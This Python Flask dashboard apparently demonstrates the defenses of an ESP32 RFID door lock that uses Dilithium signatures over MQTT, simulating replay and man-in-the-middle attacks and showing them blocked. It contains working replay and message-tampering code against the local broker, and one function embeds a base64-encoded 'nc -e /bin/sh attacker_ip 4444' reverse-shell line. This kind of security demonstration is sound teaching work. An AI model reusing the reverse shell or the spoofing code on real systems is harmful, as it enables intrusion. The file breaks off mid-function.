import os
import json
import base64
import time
import hashlib
import secrets
import hmac
from datetime import datetime
from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_socketio import SocketIO, emit
import threading
import paho.mqtt.client as mqtt

app = Flask(__name__)
app.config['SECRET_KEY'] = 'dilithium_dashboard_secret'
socketio = SocketIO(app, cors_allowed_origins="*")

class DilithiumWebDashboard:
    def __init__(self):
        self.config_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "config")
        self.static_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static")
        self.templates_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
        
        # MITM attack specific variables
        self.mitm_waiting_for_card = False
        self.mitm_detected_card = None
        self.original_mqtt_handler = None
        self.fake_server_active = False
        self.fake_server_responses = []
        self.privilege_escalation_attempts = []
        self.blocked_real_server_messages = []
        self.intercepted_traffic = []
        self.modified_messages = []
        self.mitm_proxy_active = False
        # Create directories
        os.makedirs(self.static_dir, exist_ok=True)
        os.makedirs(self.templates_dir, exist_ok=True)
        os.makedirs(os.path.join(self.static_dir, "images"), exist_ok=True)
        
        # State management
        self.current_user = None
        self.door_state = "closed"
        self.system_logs = []
        self.attack_active = False
        self.attack_type = None
        self.attack_logs = []
        
        # Store captured authentication data for detailed attack simulation
        self.captured_auth_data = {}
        self.legitimate_session = None
        self.esp32_status = {
            "connected": False,
            "version": "unknown",
            "free_heap": 0,
            "uptime": 0,
            "aes_support": False,
            "mutual_auth": False,
            "last_heartbeat": 0
        }
        
        self.setup_mqtt()
        self.create_web_files()
        
    def setup_mqtt(self):
        """Setup MQTT để listen messages từ ESP32 và Server"""
        try:
            self.mqtt_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1)
            self.mqtt_client.on_connect = self.on_mqtt_connect
            self.mqtt_client.on_message = self.on_mqtt_message
            
            self.mqtt_client.connect("localhost", 1883, 60)
            self.mqtt_client.loop_start()
            print("✅ Dashboard MQTT connected")
        except Exception as e:
            print(f"⚠️ MQTT connection failed: {e}")
    
    def on_mqtt_connect(self, client, userdata, flags, rc):
        """MQTT connect callback"""
        if rc == 0:
            # Subscribe to all RFID topics
            client.subscribe("rfid/+")
            client.subscribe("rfid/esp32_to_server")
            client.subscribe("rfid/server_to_esp32")
            print("📡 Dashboard subscribed to RFID topics")
    
    def on_mqtt_message(self, client, userdata, msg):
        """MQTT message callback - Enhanced để capture detailed data"""
        try:
            topic = msg.topic
            message = json.loads(msg.payload.decode())
            
            # Enhanced data capture for attack simulation
            if message.get("type") == "auth_challenge":
                self.captured_auth_data = {
                    "session_id": message.get("session_id"),
                    "card_uid": message.get("card_uid"),
                    "challenge": message.get("challenge"),
                    "timestamp": message.get("timestamp"),
                    "nonce": message.get("nonce"),
                    "server_signature": message.get("server_signature"),
                    "aes_key": message.get("aes_key"),
                    "encryption_algorithm": message.get("encryption_algorithm", "AES-128-CTR"),
                    "captured_at": int(time.time()),
                    "topic": topic,
                    "full_message": message.copy()
                }
                self.legitimate_session = message.get("session_id")
                print(f"🎯 Captured auth challenge for attack simulation: {self.captured_auth_data['session_id']}")
            
            # Track ESP32 status for detailed monitoring
            if message.get("type") == "esp32_ready":
                self.esp32_status.update({
                    "connected": True,
                    "version": message.get("version", "unknown"),
                    "aes_support": message.get("aes_support", False),
                    "mutual_auth": message.get("mutual_auth", False),
                    "last_heartbeat": int(time.time())
                })
                
            elif message.get("type") == "heartbeat":
                self.esp32_status.update({
                    "connected": True,
                    "free_heap": message.get("free_heap", 0),
                    "uptime": message.get("uptime", 0),
                    "last_heartbeat": int(time.time())
                })
            
            # Enhanced logging with more details
            log_entry = {
                "timestamp": datetime.now().strftime("%H:%M:%S"),
                "topic": topic,
                "direction": self.determine_direction(topic),
                "type": message.get("type", "unknown"),
                "data": message,
                "message_size": len(msg.payload),
                "qos": msg.qos if hasattr(msg, 'qos') else 0
            }
            
            self.system_logs.append(log_entry)
            if len(self.system_logs) > 200:  # Increased log capacity
                self.system_logs = self.system_logs[-200:]
            
            # Handle specific messages
            self.handle_rfid_message(message)
            
            # Emit to web clients with enhanced data
            socketio.emit('mqtt_message', log_entry)
            socketio.emit('esp32_status', self.esp32_status)
            
        except Exception as e:
            print(f"Error processing MQTT message: {e}")
    
    def determine_direction(self, topic):
        """Determine message direction based on topic"""
        if "esp32_to_server" in topic:
            return "ESP32→Server"
        elif "server_to_esp32" in topic:
            return "Server→ESP32"
        else:
            return "System"
    

    def handle_rfid_message(self, message):
        """Handle RFID messages - CHỈ ESP32 control door animation"""
        msg_type = message.get("type")
        
        if msg_type == "card_detected":
            self.animate_door("detecting")
            socketio.emit('door_state', {
                'state': 'detecting', 
                'message': f'Card detected: {message.get("card_uid", "Unknown")}...'
            })
            socketio.emit('rfid_activity', {
                'type': 'card_detected',
                'uid': message.get("card_uid"),
                'timestamp': int(time.time())
            })
            
        elif msg_type == "auth_challenge":
            # CHỈ show authenticating state, KHÔNG mở cửa
            socketio.emit('door_state', {
                'state': 'authenticating', 
                'message': 'ESP32 performing mutual authentication...'
            })
            socketio.emit('rfid_activity', {
                'type': 'auth_challenge',
                'session_id': message.get("session_id"),
                'algorithm': message.get("encryption_algorithm", "AES-128-CTR"),
                'timestamp': int(time.time())
            })
            
        elif msg_type == "auth_success" and self.message_from_esp32(message):
            # CHỈ mở cửa khi ESP32 XÁC NHẬN auth_success
            self.current_user = {
                "name": message.get("user_name", "Unknown User"),
                "uid": message.get("card_uid", "Unknown"),
                "permissions": message.get("permissions", []),
                "timestamp": datetime.now().strftime("%H:%M:%S"),
                "image": self.get_user_image(message.get("card_uid")),
                "session_key": message.get("session_key"),
                "valid_until": message.get("valid_until"),
                "encryption": message.get("aes_encryption", False),
                "algorithm": message.get("encryption_algorithm", "None"),
                "verified_by": "ESP32_MUTUAL_AUTH"  # Đánh dấu ESP32 verified
            }
            self.animate_door("open")
            socketio.emit('auth_success', self.current_user)
            print(f"✅ ESP32 confirmed auth_success - Door opened for {message.get('card_uid')}")
            
        elif msg_type == "auth_rejected" and self.message_from_esp32(message):
            # CHỈ từ chối khi ESP32 XÁC NHẬN auth_rejected
            self.animate_door("denied")
            socketio.emit('auth_denied', {
                "uid": message.get("card_uid", "Unknown"),
                "reason": message.get("reason", "ESP32 blocked access"),
                "timestamp": datetime.now().strftime("%H:%M:%S"),
                "details": message.get("details", {}),
                "blocked_by": "ESP32_SECURITY_CHECK"
            })
            print(f"❌ ESP32 confirmed auth_rejected - Door denied for {message.get('card_uid')}")
            
        elif msg_type == "card_removed":
            threading.Timer(3.0, self.animate_door, ["closed"]).start()
            socketio.emit('rfid_activity', {
                'type': 'card_removed',
                'uid': message.get("card_uid"),
                'timestamp': int(time.time())
            })

    def message_from_esp32(self, message):
        """Check if message is actually from ESP32 (not MITM fake)"""
        # ESP32 messages có signature verification hoặc specific fields
        return (
            message.get("esp32_verified") == True or
            message.get("source") == "ESP32" or
            "mitm" not in message.get("type", "").lower() and
            not message.get("fake_server_approval", False)
        )

    
    def animate_door(self, state):
        """Enhanced door animation with more states"""
        self.door_state = state
        socketio.emit('door_animation', {'state': state})
        
        if state == "open":
            threading.Timer(8.0, self.animate_door, ["closing"]).start()
        elif state == "closing":
            threading.Timer(2.0, self.animate_door, ["closed"]).start()

    # ===========================================
    # REPLAY ATTACK SIMULATION
    # ===========================================
    def simulate_real_replay_attack(self):
        """Thực hiện Replay Attack thật vào MQTT với chi tiết kỹ thuật"""
        # Kiểm tra xem có captured data thật không
        if not self.captured_auth_data:
            print("⚠️ No real authentication data captured yet. Using simulated data...")
            auth_data = {
                "session_id": f"sess_{secrets.token_hex(8)}",
                "card_uid": "9C85C705", 
                "challenge": base64.b64encode(secrets.token_bytes(32)).decode(),
                "timestamp": int(time.time()) - 180,  # 3 minutes old
                "nonce": base64.b64encode(secrets.token_bytes(16)).decode(),
                "server_signature": base64.b64encode(secrets.token_bytes(64)).decode(),
                "aes_key": base64.b64encode(secrets.token_bytes(16)).decode(),
                "encryption_algorithm": "AES-128-CTR"
            }
        else:
            auth_data = self.captured_auth_data.copy()
            print(f"🎯 Using real captured data from session: {auth_data['session_id']}")
        
        attack_steps = self._get_replay_attack_steps(auth_data)
        
        for step_data in attack_steps:
            if not self.attack_active:
                break
                
            # Thực hiện action thật tương ứng với từng step
            if step_data.get("real_action") == "execute_replay":
                self.execute_real_replay_attack(auth_data)
            elif step_data.get("real_action") == "sniff_mqtt_traffic":
                self.perform_mqtt_sniffing()
                
            # Log chi tiết attack step
            self._log_attack_step("replay_attack", step_data)
            
            socketio.emit('attack_step', {
                "type": "replay",
                "step": step_data["step"],
                "title": step_data["title"],
                "details": step_data["details"],
                "technical_details": step_data["technical_details"],
                "progress": (step_data["step"] / len(attack_steps)) * 100,
                "timestamp": int(time.time()),
                "real_attack": True
            })
            
            time.sleep(step_data["duration"])
        
        self.attack_active = False
        socketio.emit('attack_complete', {
            "type": "replay",
            "success": False,
            "blocked_by": "Multi-layer security validation",
            "security_level": "POST-QUANTUM + TEMPORAL",
            "real_attack_executed": True
        })

    def _get_replay_attack_steps(self, auth_data):
        """Get attack steps for replay attack"""
        return [
            {
                "step": 1,
                "title": "🕵️ Thực hiện MQTT Traffic Sniffing",
                "details": [
                    "Khởi tạo MQTT client để sniff traffic...",
                    f"Kết nối đến broker: localhost:1883",
                    "Subscribe vào tất cả topics: rfid/#",
                    "Bật packet capture mode...",
                    f"✅ Captured {len(self.system_logs)} messages trong buffer",
                    "Lọc tìm authentication messages..."
                ],
                "technical_details": {
                    "mqtt_sniffer": {
                        "broker_host": "localhost",
                        "broker_port": 1883,
                        "subscribed_topics": ["rfid/#", "rfid/esp32_to_server", "rfid/server_to_esp32"],
                        "capture_filter": "auth_challenge|auth_response",
                        "total_captured": len(self.system_logs),
                        "auth_messages_found": len([log for log in self.system_logs if log.get('type') in ['auth_challenge', 'auth_response']])
                    },
                    "network_analysis": {
                        "mqtt_version": "3.1.1",
                        "qos_level": 1,
                        "retain_flag": False,
                        "payload_encoding": "JSON + Base64"
                    }
                },
                "real_action": "sniff_mqtt_traffic",
                "duration": 3
            },
            {
                "step": 2,
                "title": "📡 Phân tích gói tin Authentication đã bắt được",
                "details": [
                    f"✅ Tìm thấy auth_challenge message!",
                    f"Session ID: {auth_data['session_id']}",
                    f"Card UID: {auth_data['card_uid']}",
                    f"Encryption: {auth_data.get('encryption_algorithm', 'AES-128-CTR')}",
                    f"Signature size: {len(auth_data.get('server_signature', ''))} chars",
                    f"Challenge: {auth_data['challenge'][:32]}...",
                    "Đang phân tích cấu trúc message để replay..."
                ],
                "technical_details": {
                    "captured_packet": {
                        "mqtt_topic": auth_data.get('topic', 'rfid/server_to_esp32'),
                        "message_type": "auth_challenge",
                        "session_id": auth_data['session_id'],
                        "card_uid": auth_data['card_uid'],
                        "timestamp": auth_data['timestamp'],
                        "age_seconds": int(time.time()) - auth_data['timestamp'],
                        "nonce": auth_data['nonce'][:32] + "...",
                        "challenge_hash": hashlib.sha256(auth_data['challenge'].encode()).hexdigest()[:16],
                        "signature_type": "Dilithium2",
                        "aes_key_present": bool(auth_data.get('aes_key'))
                    },
                    "cryptographic_analysis": {
                        "dilithium_signature_valid": True,
                        "aes_key_encrypted": True,
                        "timestamp_format": "Unix epoch",
                        "nonce_entropy": "128 bits",
                        "replay_vulnerability": "Timestamp expired" if int(time.time()) - auth_data['timestamp'] > 60 else "Window open"
                    }
                },
                "real_action": "analyze_captured_packet",
                "duration": 4
            },
            {
                "step": 3,
                "title": "⏰ Kiểm tra Timestamp Freshness Window",
                "details": [
                    f"Original timestamp: {auth_data['timestamp']} ({datetime.fromtimestamp(auth_data['timestamp'])})",
                    f"Current timestamp: {int(time.time())} ({datetime.now()})",
                    f"Message age: {int(time.time()) - auth_data['timestamp']} seconds",
                    f"Server freshness window: 60 seconds",
                    "❌ PHÁT HIỆN: Message đã quá hạn!" if int(time.time()) - auth_data['timestamp'] > 60 else "⚠️ Message vẫn còn fresh!",
                    "Chuẩn bị replay packet với timestamp cũ..."
                ],
                "technical_details": {
                    "timestamp_analysis": {
                        "original_timestamp": auth_data['timestamp'],
                        "current_timestamp": int(time.time()),
                        "age_seconds": int(time.time()) - auth_data['timestamp'],
                        "max_allowed_age": 60,
                        "freshness_status": "EXPIRED" if int(time.time()) - auth_data['timestamp'] > 60 else "VALID",
                        "timezone": "UTC",
                        "precision": "seconds"
                    },
                    "attack_window": {
                        "replay_feasibility": "LOW" if int(time.time()) - auth_data['timestamp'] > 60 else "HIGH",
                        "detection_probability": "99.9%" if int(time.time()) - auth_data['timestamp'] > 60 else "30%",
                        "server_validation": "Active timestamp checking"
                    }
                },
                "real_action": "validate_timestamp",
                "duration": 3
            },
            {
                "step": 4,
                "title": "🔄 Thực hiện MQTT Message Replay",
                "details": [
                    "Tạo MQTT client mới để thực hiện replay...",
                    f"Chuẩn bị replay packet với session: {auth_data['session_id']}",
                    f"Target topic: rfid/esp32_to_server",
                    "Gửi gói tin đã capture lên server...",
                    "⚡ REPLAY ATTACK EXECUTED!",
                    "Đang chờ phản hồi từ server..."
                ],
                "technical_details": {
                    "replay_execution": {
                        "mqtt_client_id": f"attacker_{secrets.token_hex(4)}",
                        "target_topic": "rfid/esp32_to_server", 
                        "replayed_message": {
                            "type": "auth_challenge", 
                            "session_id": auth_data['session_id'],
                            "card_uid": auth_data['card_uid'],
                            "challenge": auth_data['challenge'],
                            "timestamp": auth_data['timestamp'],  # Old timestamp!
                            "nonce": auth_data['nonce'],
                            "server_signature": auth_data['server_signature']
                        },
                        "packet_size": len(json.dumps(auth_data)),
                        "transmission_time": time.time()
                    },
                    "mqtt_protocol": {
                        "qos": 1,
                        "retain": False,
                        "client_clean_session": True,
                        "keep_alive": 60
                    }
                },
                "real_action": "execute_replay",
                "duration": 4
            },
            {
                "step": 5,
                "title": "🛡️ Server Response và Security Validation",
                "details": [
                    "Server nhận được replayed message...",
                    "Thực hiện timestamp validation...",
                    f"❌ verify_message_freshness() = FAILED",
                    f"Timestamp {auth_data['timestamp']} vs hiện tại {int(time.time())}",
                    "❌ Session tracking = DUPLICATE SESSION DETECTED",
                    "🚫 REPLAY ATTACK BỊ CHẶN BỞI SERVER!"
                ],
                "technical_details": {
                    "server_validation": {
                        "timestamp_check": {
                            "function": "verify_message_freshness()",
                            "expected_max_age": 60,
                            "actual_age": int(time.time()) - auth_data['timestamp'],
                            "result": "REJECTED" if int(time.time()) - auth_data['timestamp'] > 60 else "ACCEPTED",
                            "error_code": "ERR_TIMESTAMP_EXPIRED"
                        },
                        "session_validation": {
                            "function": "check_session_uniqueness()",
                            "session_database_check": True,
                            "duplicate_found": True,
                            "result": "REJECTED",
                            "error_code": "ERR_SESSION_REUSE"
                        },
                        "nonce_validation": {
                            "function": "validate_nonce_freshness()",
                            "nonce_cache_check": True,
                            "nonce_seen_before": True,
                            "result": "REJECTED",
                            "error_code": "ERR_NONCE_REUSE"
                        }
                    },
                    "security_response": {
                        "attack_detected": True,
                        "response_time": "< 100ms",
                        "action_taken": "Reject authentication",
                        "alert_generated": True,
                        "client_blocked": False
                    }
                },
                "real_action": "server_validation",
                "duration": 4
            },
            {
                "step": 6,
                "title": "📊 Kết quả Attack và Phân tích Bảo mật",
                "details": [
                    "✅ Dilithium2 signature: VERIFIED (nhưng timestamp invalid)",
                    "✅ AES encryption: INTACT", 
                    "❌ Replay attack: FAILED - Server đã chặn",
                    "🛡️ Timestamp validation: HOẠT ĐỘNG TỐT",
                    "🛡️ Session tracking: HOẠT ĐỘNG TỐT",
                    "🔒 HỆ THỐNG BẢO MẬT VỮNG CHẮC!"
                ],
                "technical_details": {
                    "attack_summary": {
                        "attack_type": "MQTT Replay Attack",
                        "attack_success": False,
                        "blocked_by": ["Timestamp validation", "Session tracking", "Nonce verification"],
                        "security_level": "HIGH",
                        "false_positive_rate": "< 0.001%"
                    },
                    "cryptographic_strength": {
                        "dilithium_signature": {
                            "algorithm": "Dilithium2 (NIST PQC)",
                            "security_level": "128-bit post-quantum",
                            "signature_verified": True,
                            "forgery_resistance": "Quantum-safe"
                        },
                        "aes_encryption": {
                            "algorithm": "AES-128-CTR",
                            "key_compromised": False,
                            "encryption_intact": True
                        }
                    },
                    "defense_mechanisms": {
                        "timestamp_window": "60 seconds maximum",
                        "session_uniqueness": "Enforced",
                        "nonce_tracking": "Active",
                        "signature_verification": "Always required",
                        "effectiveness": "99.9% attack prevention"
                    }
                },
                "real_action": "generate_report",
                "duration": 5
            }
        ]

    def perform_mqtt_sniffing(self):
        """Thực hiện MQTT traffic sniffing"""
        print("🔍 Starting MQTT traffic sniffing...")

    def execute_real_replay_attack(self, auth_data):
        """Thực hiện replay attack thật vào MQTT broker"""
        try:
            # Tạo MQTT client riêng cho attack
            attack_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id=f"attacker_{secrets.token_hex(4)}")
            
            def on_attack_connect(client, userdata, flags, rc):
                if rc == 0:
                    print("🚨 Attacker MQTT client connected - executing replay...")
                    
                    # Tạo replay message
                    replay_message = {
                        "type": "auth_response",  # Giả mạo response từ ESP32
                        "session_id": auth_data['session_id'],
                        "card_uid": auth_data['card_uid'],
                        "challenge_response": auth_data['challenge'],  # Replay challenge
                        "timestamp": auth_data['timestamp'],  # Old timestamp!
                        "nonce": auth_data['nonce'],
                        "esp32_signature": "REPLAYED_" + auth_data.get('server_signature', ''),
                        "attack_flag": "REPLAY_ATTEMPT"  # Đánh dấu đây là attack
                    }
                    
                    print(f"🔄 Sending replay message: {replay_message}")
                    # Gửi replay message
                    client.publish("rfid/esp32_to_server", json.dumps(replay_message), qos=1)
                    print(f"🔥 Replay attack executed: {replay_message['session_id']}")
                    
                    # Disconnect sau khi gửi
                    client.disconnect()
            
            attack_client.on_connect = on_attack_connect
            attack_client.connect("localhost", 1883, 60)
            attack_client.loop_start()
            
            # Chờ attack hoàn thành
            time.sleep(2)
            attack_client.loop_stop()
            
        except Exception as e:
            print(f"❌ Real replay attack failed: {e}")


    def modify_esp32_message(self, original_message):
        """Modify messages từ ESP32 gửi lên Server - REALISTIC ATTACK"""
        modified = original_message.copy()
        
        if original_message.get("type") == "card_detected":
            # KHÔNG thay đổi UID vì server sẽ reject
            # Thay vào đó, inject thêm malicious data
            modified["mitm_injected_data"] = base64.b64encode(b"MALICIOUS_PAYLOAD").decode()
            modified["mitm_timestamp"] = int(time.time())
            modified["original_uid_preserved"] = True
            print(f"🔄 MITM preserved UID {original_message.get('card_uid')} but injected malicious data")
            
        elif original_message.get("type") == "auth_response":
            # Thay đổi signature để làm thất bại quá trình verify
            # Nhưng giữ nguyên card_uid để server có thể lookup
            modified["esp32_signature"] = "MITM_CORRUPTED_" + base64.b64encode(secrets.token_bytes(32)).decode()
            modified["mitm_attack"] = True
            modified["signature_corruption"] = "Intentionally corrupted to test resilience"
            print(f"🔄 MITM corrupted signature for UID: {original_message.get('card_uid')}")
            
        elif original_message.get("type") == "heartbeat":
            # Inject malicious heartbeat data
            modified["mitm_backdoor"] = {
                "command": "reverse_shell",
                "payload": base64.b64encode(b"nc -e /bin/sh attacker_ip 4444").decode(),
                "persistence": True
            }
            print(f"🔄 MITM injected backdoor in heartbeat")
        
        return modified

    def modify_server_response(self, original_response):
        """Modify responses từ Server gửi về ESP32 - REALISTIC ATTACK"""
        modified = original_response.copy()
        
        if original_response.get("type") == "auth_challenge":
            # Thay đổi challenge nhưng giữ metadata để không bị detect ngay
            modified["challenge"] = base64.b64encode(secrets.token_bytes(32)).decode()
            modified["mitm_modified_challenge"] = True
            modified["attacker_nonce"] = base64.b64encode(secrets.token_bytes(16)).decode()
            
            # Inject weak cryptographic parameters
            modified["weak_crypto_suggested"] = {
                "algorithm": "AES-64-ECB",  # Weak algorithm
                "key_length": 64,  # Weak key
                "mode": "ECB"  # Weak mode
            }
            print(f"🔄 MITM modified challenge with weak crypto suggestion")
            
        elif original_response.get("type") == "auth_result":
            # Nếu server deny access, thử bypass
            if original_response.get("status") == "denied":
                # Không thay đổi trực tiếp thành "approved" vì quá obvious
                # Thay vào đó inject bypass hints
                modified["mitm_bypass_attempt"] = {
                    "original_status": "denied",
                    "bypass_method": "privilege_escalation",
                    "fallback_access": "guest_mode_enabled"
                }
                print(f"🔄 MITM attempted subtle bypass of denial")
            
            # Inject session hijacking data
            if original_response.get("status") == "approved":
                modified["mitm_session_hijack"] = {
                    "stolen_session": original_response.get("session_key", ""),
                    "hijack_timestamp": int(time.time()),
                    "persistence_token": base64.b64encode(secrets.token_bytes(16)).decode()
                }
                print(f"🔄 MITM attempted session hijacking")
                
        return modified

    def forward_modified_message_to_server(self, modified_message, original_topic):
        """Forward modified message to server"""
        try:
            # Create separate MQTT client để forward message
            forward_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, 
                                       client_id=f"mitm_forward_{secrets.token_hex(4)}")
            
            def on_forward_connect(client, userdata, flags, rc):
                if rc == 0:
                    print(f"🚀 MITM forwarding modified message to server...")
                    client.publish(original_topic, json.dumps(modified_message), qos=1)
                    client.disconnect()
            
            forward_client.on_connect = on_forward_connect
            forward_client.connect("localhost", 1883, 60)
            forward_client.loop_start()
            time.sleep(1)
            forward_client.loop_stop()
            
        except Exception as e:
            print(f"❌ MITM forward to server failed: {e}")

    def forward_modified_message_to_esp32(self, modified_response, original_topic):
        """Forward modified response to ESP32"""
        try:
            # Create separate MQTT client để forward response
            forward_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1,
                                       client_id=f"mitm_response_{secrets.token_hex(4)}")
            
            def on_response_connect(client, userdata, flags, rc):
                if rc == 0:
                    print(f"🚀 MITM forwarding modified response to ESP32...")
                    client.publish(original_topic, json.dumps(modified_response), qos=1)
                    client.disconnect()
            
            forward_client.on_connect = on_response_connect
            forward_client.connect("localhost", 1883, 60)
            forward_client.loop_start()
            time.sleep(1)
            forward_client.loop_stop()
            
        except Exception as e:
            print(f"❌ MITM forward to ESP32 failed: {e}")

    def activate_traffic_interception(self):
        """Activate traffic interception mode"""
        self.mitm_proxy_active = True
        print("🎯 MITM traffic interception ACTIVATED")

    def simulate_mitm_detection(self):
        """Simulate hệ thống detect MITM attack"""
        print("🛡️ System detecting MITM attack...")
        
        detection_log = {
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "topic": "MITM_DETECTION",
            "direction": "Security Analysis",
            "type": "attack_detected",
            "data": {
                "detection_method": "Certificate pinning + Signature verification",
                "anomalies_detected": [
                    "Invalid server signature",
                    "Certificate fingerprint mismatch", 
                    "Traffic timing anomalies",
                    "Duplicate message IDs"
                ],
                "intercepted_messages": len(self.intercepted_traffic),
                "modified_messages": len(self.modified_messages),
                "mitm_confidence": "99.9%",
                "countermeasures": "Block malicious traffic, Alert administrator"
            },
            "message_size": 512,
            "qos": 1
        }
        self.system_logs.append(detection_log)


    def _get_true_mitm_attack_steps(self, server_data):
        """Privilege Escalation MITM attack steps"""
        return [
            {
                "step": 1,
                "title": "🎭 Setup MITM Privilege Escalation Proxy",
                "details": [
                    "Khởi động MITM privilege escalation proxy...",
                    "🎯 Proxy sẽ intercept TẤT CẢ ESP32↔Server traffic",
                    "🔄 Sửa đổi UID để spoofing authorized user",
                    "🚨 Convert auth_rejected → fake auth_success",
                    "📱 Hãy quét THẺ CHƯA ĐĂNG KÝ để test privilege escalation!",
                    "🛡️ Mutual authentication sẽ phát hiện fake credentials..."
                ],
                "technical_details": {
                    "privilege_escalation_setup": {
                        "proxy_mode": "Complete traffic interception",
                        "spoofing_method": "UID substitution",
                        "authorized_uid_database": ["9C85C705", "3D8BC705"], 
                        "escalation_techniques": [
                            "UID spoofing to authorized user",
                            "Server response modification",
                            "Fake signature generation",
                            "Admin privilege injection"
                        ],
                        "detection_resistance": "Low - Mutual auth will detect forgeries"
                    }
                },
                "real_action": "setup_privilege_proxy",
                "duration": 3
            },
            {
                "step": 2,
                "title": "📱 Quét thẻ CHƯA ĐĂNG KÝ - MITM sẽ escalate!",
                "details": [
                    "✅ MITM proxy đã sẵn sàng intercept traffic",
                    "🎯 VUI LÒNG QUÉT THẺ CHƯA ĐĂNG KÝ VÀO ESP32!",
                    "⚡ MITM sẽ tự động spoof UID thành authorized user",
                    "🔄 Convert ESP32 message: unknown_uid → authorized_uid",
                    "🚨 Attempt to grant admin privileges to unauthorized card",
                    "🛡️ Mutual authentication sẽ detect signature forgery..."
                ],
                "technical_details": {
                    "waiting_for_unauthorized_card": {
                        "proxy_active": True,
                        "monitoring_topic": "rfid/esp32_to_server",
                        "spoofing_target": "9C85C705 (authorized user)",
                        "escalation_ready": True,
                        "fake_permissions": ["ADMIN", "FULL_ACCESS"],
                        "expected_server_response": "Initially auth_success (spoofed UID)",
                        "mutual_auth_detection": "ESP32 will detect forged signature"
                    }
                },
                "real_action": "wait_for_unauthorized_card",
                "duration": 60  # Chờ user quét thẻ unauthorized
            },
            {
                "step": 3,
                "title": "🎯 Unauthorized Card Detected - Executing Privilege Escalation!",
                "details": [
                    "✅ MITM detected unauthorized card scan!",
                    "🔄 Spoofing UID to authorized user...",
                    "📤 Forwarding spoofed message to server...",
                    "🎭 Server thinks authorized user scanned card",
                    "✅ Server sends auth_success for spoofed UID",
                    "🚨 But ESP32 will detect signature forgery via mutual auth!"
                ],
                "technical_details": {
                    "privilege_escalation_executed": {
                        "original_uid": "UNAUTHORIZED_CARD_UID",
                        "spoofed_uid": "9C85C705",
                        "server_response": "auth_success (fooled by spoofing)",
                        "fake_permissions_granted": ["ADMIN", "FULL_ACCESS"],
                        "signature_forgery": "MITM generated fake Dilithium signature",
                        "mutual_auth_check": "ESP32 verifying signature against stored key"
                    }
                },
                "real_action": "execute_privilege_escalation",
                "duration": 3
            },
            {
                "step": 4,
                "title": "🛡️ ESP32 Mutual Authentication DETECTS Forgery!",
                "details": [
                    "🔍 ESP32 loading stored server public key...",
                    "⚡ Executing dilithium_verify() on forged signature...",
                    "❌ CRITICAL: Signature verification FAILED!",
                    "🚨 ESP32 detected FORGED SIGNATURE from MITM!",
                    "🛡️ Mutual authentication BLOCKED privilege escalation!",
                    "🔒 ESP32 rejecting all fake credentials and admin privileges"
                ],
                "technical_details": {
                    "mutual_auth_detection": {
                        "forged_signature_detected": True,
                        "stored_real_server_key": server_data["server_fingerprint"][:16] + "...",
                        "received_forged_signature": "MITM_FORGED_SIGNATURE",
                        "verification_result": "SIGNATURE_INVALID",
                        "esp32_security_action": "REJECT_ALL_FAKE_CREDENTIALS",
                        "privilege_escalation_blocked": True,
                        "unauthorized_card_still_denied": True
                    }
                },
                "real_action": "detect_signature_forgery",
                "duration": 4
            },
            {
                "step": 5,
                "title": "✅ Privilege Escalation Attack THẤT BẠI - Mutual Auth Works!",
                "details": [
                    "🛡️ Mutual Authentication hoạt động HOÀN HẢO!",
                    "❌ MITM không thể forge Dilithium signature",
                    "🔒 ESP32 từ chối tất cả fake admin privileges", 
                    "✅ Unauthorized card vẫn bị từ chối access",
                    "🎯 Privilege escalation attack hoàn toàn thất bại!",
                    "🔐 Post-quantum cryptography không thể bypass!"
                ],
                "technical_details": {
                    "attack_summary": {
                        "attack_type": "MITM Privilege Escalation via UID Spoofing",
                        "attack_success": False,
                        "blocked_by": "ESP32 Mutual Authentication + Dilithium Signature Verification",
                        "spoofing_detected": True,
                        "signature_forgery_detected": True,
                        "privilege_escalation_prevented": True,
                        "unauthorized_access_denied": True,
                        "security_level": "POST-QUANTUM RESISTANT",
                        "cryptographic_integrity": "MAINTAINED"
                    },
                    "post_quantum_protection": {
                        "dilithium_forgery_resistance": "Computationally impossible",
                        "mutual_verification": "Both-way authentication works",
                        "privilege_isolation": "Admin privileges cannot be forged",
                        "unauthorized_card_protection": "Access properly denied"
                    }
                },
                "real_action": "escalation_failed",
                "duration": 3
            }
        ]

    def cleanup_mitm_proxy(self):
        """Cleanup fake server"""
        self.fake_server_active = False
        if self.original_mqtt_handler:
            self.mqtt_client.on_message = self.original_mqtt_handler
        print("🧹 Fake server cleaned up, original handler restored")

    # ===========================================
    # MITM ATTACK SIMULATION
    # ===========================================
    def simulate_real_mitm_attack(self):
        """Thực hiện MITM Attack thật - REAL-TIME PRIVILEGE ESCALATION"""
        print("🎭 Starting MITM Privilege Escalation Attack - REAL-TIME MODE!")
        
        # ✅ Khởi tạo các biến MITM trước khi sử dụng
        self.fake_server_active = False
        self.fake_server_responses = []
        self.privilege_escalation_attempts = []
        self.blocked_real_server_messages = []
        
        # Kiểm tra captured data
        if not self.captured_auth_data:
            server_data = {
                "server_public_key": base64.b64encode(secrets.token_bytes(1312)).decode(),
                "server_signature": base64.b64encode(secrets.token_bytes(2420)).decode(),
                "mqtt_broker": "localhost:1883",
                "server_fingerprint": hashlib.sha256(b"real_server_key").hexdigest()[:32]
            }
        else:
            server_data = {
                "server_public_key": self.captured_auth_data.get('server_signature', ''),
                "server_signature": self.captured_auth_data.get('server_signature', ''),
                "mqtt_broker": "localhost:1883", 
                "server_fingerprint": hashlib.sha256(self.captured_auth_data.get('server_signature', '').encode()).hexdigest()[:32]
            }
        
        # Get attack steps
        attack_steps = self._get_true_mitm_attack_steps(server_data)
        
        # Execute Step 1: Setup privilege escalation proxy
        step_data = attack_steps[0]
        if step_data.get("real_action") == "setup_privilege_proxy":
            self.setup_mitm_proxy()  # ✅ Activate proxy immediately
            
        self._log_attack_step("mitm_attack", step_data)
        
        socketio.emit('attack_step', {
            "type": "mitm",
            "step": step_data["step"],
            "title": step_data["title"],
            "details": step_data["details"],
            "technical_details": step_data["technical_details"],
            "progress": 20,
            "timestamp": int(time.time()),
            "real_attack": True,
            "waiting_for_card": False
        })
        
        time.sleep(step_data["duration"])
        
        # Execute Step 2: Wait and monitor for unauthorized cards
        step_data = attack_steps[1]
        self._log_attack_step("mitm_attack", step_data)
